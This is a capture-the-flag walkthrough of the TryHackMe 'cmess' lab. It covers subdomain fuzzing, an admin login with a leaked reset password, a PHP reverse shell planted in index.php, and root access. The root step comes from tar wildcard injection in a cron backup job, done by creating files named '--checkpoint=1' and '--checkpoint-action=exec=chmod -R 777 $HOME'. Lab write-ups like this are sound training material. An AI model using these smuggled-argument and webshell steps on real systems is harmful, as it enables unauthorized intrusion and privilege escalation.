# [tryhackme/cmess](https://tryhackme.com/room/cmess)
## Setup
- Add `cmess.thm` to hosts file as instructed

## Enumeration
- Scanning
  - Rustscan says ssh and http are available
  - Feroxbuster doesn't show much interesting stuff
    - admin panel is at `/admin`
    - there is a `/src` directory tree but everything is 403 access denied
- Use burp intruder to scan subdomains (see hint 1)
  - Send request for `/` to intruder (ctrl+I)
  - Use intruder to modify Host header (`Host: Â§Â§.cmess.thm`)
  - Import some payloads, I used `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
  - Start attack
- `dev.cmess.thm` contains password reset for andre: `XXXXXXXXXXX`

## Exploitation

### Initial shell
- Use password reset we found to login into `/admin` as `andre@cmess.thm`
- Use file manager to modify index.php and add reverse shell (revshells.com - PHP PenTestMonkey)

### Getting ssh access
- Access reverse shell (navigate to `/` in browser)
  - Looked for suid `find / -perm /6000 -type f -executable 2>/dev/null` - nothing
  - `sudo -l` - nothing
  - Cannot access /home/andre
  - In /opt there is a file called `.password.bak` though
  - `/opt/.password.bak` contains a plaintext password ðŸ¤”
- Use password here to login with ssh as andre
- Now we can access `/home/andre/user.txt`

### Priviledge escalation
- In andre's home folder he has folder called backup
  - The note contained here says everything in the folder will get backed up
  - After finding no SUID bins earlier and checking `sudo -l` it's a pretty easy guess that the backup script will allow for privesc
- Proceed to search for script that does backing up
  - `find / -iname "*backup*" 2>/dev/null` - nothing
  - `crontab -e` - nothing
  - `vim /etc/crontab` - bingo

```

```
- Backup uses tar followed by a `*` meaning we should use an unsafe shell expansion
  - gtfobins has a [nice guide](https://gtfobins.github.io/gtfobins/tar/#sudo) for how to get tar to exec commands
  - The * in `cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *` will expand to the names of the files in `/home/andre/backup`
    - This means by creating files in this directory we can control the arguments to tar and execute the exploit described on gtfobins
    - There are some limitations to this though as file names cannot contain some characters like `/`
    - I find the easiest way for me to create files with weird names like `--checkpoint=1` is with vim see below
  - Ended up just chmodding `/root` to 777 (easier than trying to get a shell)
 
#### Setting arguments with bash file expansion
When a command contains a `*` the shell will automatically expand this `*` to a space-seperated list of file names in the current directory.

To exploit this we need to come up with a command to execute with no `/` in here I will use `chmod -R 777 $HOME` as all we need to do is read `/root/root.txt`,
by chmodding we can read this file from our current user.

The command we are aiming to execute is
```bash
cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz --checkpoint=1 "--checkpoint-action=exec=chmod -R 777 $HOME"
```

To do this we first cd to `/home/andre/backup`

Then create the first argument with vim
1. run `vim`
2. type `:wq --checkpoint=1`

Then the second argument
1. run `vim`
2. type `:wq --checkpoint-action=exec=chmod\ -R\ 777\ \$HOME`

When you run `ls` the output should look like this
```
andre@cmess:~/backup$ ls                                                                                                                                                                                                                     
--checkpoint=1  --checkpoint-action=exec=chmod -R 777 $HOME  note 
```

After cron executes the job you will be able to cat the final flag :)
